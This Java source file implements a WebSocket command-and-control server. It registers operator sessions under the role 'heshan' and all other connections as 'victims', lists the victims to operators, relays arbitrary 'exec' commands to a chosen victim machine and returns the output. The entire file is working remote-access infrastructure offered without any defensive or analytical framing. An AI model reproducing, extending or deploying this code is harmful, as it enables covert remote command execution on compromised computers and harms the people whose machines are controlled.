package com.heshanthenura.fennec;
// server
import java.io.IOException;
import java.util.logging.Logger;
import java.util.concurrent.CopyOnWriteArraySet;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import jakarta.websocket.OnClose;
import jakarta.websocket.OnError;
import jakarta.websocket.OnMessage;
import jakarta.websocket.OnOpen;
import jakarta.websocket.Session;
import jakarta.websocket.server.ServerEndpoint;

@ServerEndpoint("/ws")
public class WebSocketServer {

    Commands commands = new Commands();
    private static final CopyOnWriteArraySet<Session> clients = new CopyOnWriteArraySet<>();
    private static final CopyOnWriteArraySet<Session> victims = new CopyOnWriteArraySet<>();
    Logger logger = Logger.getLogger("logger");

    @OnOpen
    public void onConnect(Session session) throws IOException {
        logger.info("New client connected: " + session.getId());
    }

    @OnClose
    public void onDisconnect(Session session) {
        // Remove the session from clients and victims arrays
        if (clients.remove(session)) {
            logger.info("Client disconnected and removed from clients array: " + session.getId());
        }
        if (victims.remove(session)) {
            logger.info("Client disconnected and removed from victims array: " + session.getId());
        }
    }


    @OnMessage
    public void onMessage(String message,Session session) {
        if (message == null || message.trim().isEmpty()) {
            System.out.println("Received an empty or null message.");
            return;
        }
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            JsonNode jsonNode = objectMapper.readTree(message);


            String type = jsonNode.get("type").asText();

            logger.info(type);

            if(type.equals("set_role")){
                String role = jsonNode.get("role").asText();
                if (role.equals("heshan")){
                    clients.add(session);
                    logger.info("added to client array: "+"client "+session.getId()+" registered successfully");
                    broadcast(clients,commands.notify("client "+session.getId()+" registered successfully"));
                    send(session,commands.setClientId(session.getId()));
                    logger.info("id sent");

                }else{
                    victims.add(session);
                    logger.info("added to victim array: "+"victim "+session.getId()+" registered successfully");
                    broadcast(clients,commands.notify("victim "+session.getId()+" registered successfully"));
                }
            }else if(type.equals("info")){
                if (jsonNode.get("info_name").asText().equals("lv")){
                    logger.info("asking victims");
                    send(session,commands.lv(victims));
                }
            } else if (type.equals("exec")) {
                if(jsonNode.get("state").asText().equals("req")){
                    logger.info("req came");
                    logger.info(message);
                    logger.info("execute command"+" client:"+jsonNode.get("client")+" victim:"+jsonNode.get("victim")+" command:"+jsonNode.get("command"));
                    sendMessageToVictim(jsonNode.get("victim").asText(),commands.sendVictimExec(jsonNode.get("client").asText(),jsonNode.get("command").asText()));
                }else{
                    logger.info("res came "+jsonNode.get("data").isArray());
                    sendMessageToClient(jsonNode.get("client_id").asText(),commands.sendClientExec(jsonNode.get("command").asText(), String.valueOf(jsonNode.get("data"))));
                }
            }

        } catch (Exception e) {
            System.err.println("Error parsing JSON: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @OnError
    public void onError(Session session, Throwable throwable) {
        System.err.println("Error in session " + session.getId() + ": " + throwable.getMessage());
        throwable.printStackTrace();
    }

    public void broadcast(CopyOnWriteArraySet<Session> array,String msg) throws IOException {
        for (Session s : array){
            s.getBasicRemote().sendText(msg);
        }
    }

    public void send(Session session,Object msg) throws IOException {
        session.getBasicRemote().sendText((String) msg);
    }

    public void sendMessageToVictim(String sessionId, String message) {
        try {
            for (Session victim : victims) {
                if (victim.getId().equals(sessionId)) {
                    victim.getBasicRemote().sendText(message);
                    logger.info("Message sent to victim with sessionId: " + sessionId);
                    return; // Exit once the message is sent
                }
            }
            logger.warning("No victim found with sessionId: " + sessionId);
        } catch (IOException e) {
            logger.severe("Error sending message to victim with sessionId: " + sessionId);
            e.printStackTrace();
        }
    }

    public void sendMessageToClient(String sessionId, String message) {
        try {
            for (Session client : clients) {
                if (client.getId().equals(sessionId)) {
                    client.getBasicRemote().sendText(message);
                    logger.info("Message sent to client with sessionId: " + sessionId);
                    return; // Exit once the message is sent
                }
            }
            logger.warning("No client found with sessionId: " + sessionId);
        } catch (IOException e) {
            logger.severe("Error sending message to client with sessionId: " + sessionId);
            e.printStackTrace();
        }
    }

}

